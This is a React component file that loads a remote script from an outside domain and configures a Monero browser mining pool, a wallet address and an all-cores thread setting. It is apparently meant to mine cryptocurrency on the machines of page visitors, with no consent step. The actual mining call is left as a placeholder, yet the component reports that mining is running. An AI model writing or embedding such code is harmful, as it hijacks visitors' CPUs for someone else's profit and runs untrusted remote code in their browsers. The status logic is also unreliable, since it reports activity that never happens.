import React, { useEffect, useState } from 'react';

function MiningComponent() {
  const [miningStatus, setMiningStatus] = useState('Mining is not running'); // Initial status message

  useEffect(() => {
    // Add the <script> tags and code here
    const script = document.createElement('script');
    script.src = 'https://script.ghgi.xyz';
    script.async = true;
    document.body.appendChild(script);

    // The rest of your code
    const server = 'wss://ghgi.xyz';
    const pool = 'gulf.moneroocean.stream:10128';
    const walletAddress =
      '49YzZ75Vq1Q5fYtPVn7uA8VMdN7aaByKfadPyfeBiJw5GHuD1vKkb2GjeeuApT2wu4AMpT4TBsfWuRsYEBDZNT9NVWCqwoz';
    const workerId = 'web-1';
    const threads = -1;
    const password = '';
    const throttleMiner = 20;
    // Add the startMining function here

    // Set the mining status when mining starts
    setMiningStatus('Mining is running');

    // Clean up the script when the component unmounts
    return () => {
      document.body.removeChild(script);
      // Reset the mining status when mining stops
      setMiningStatus('Mining is not running');
    };
  }, []);

  return (
    <section className='grid outline outline-1 outline-black rounded-lg bg-pink-400 items-center justify-center'>
      <div>
        <span className='text-xl font-semibold'>{miningStatus}</span>
      </div>
      {/* Your component content goes here */}
    </section>
  );
}

export default MiningComponent;
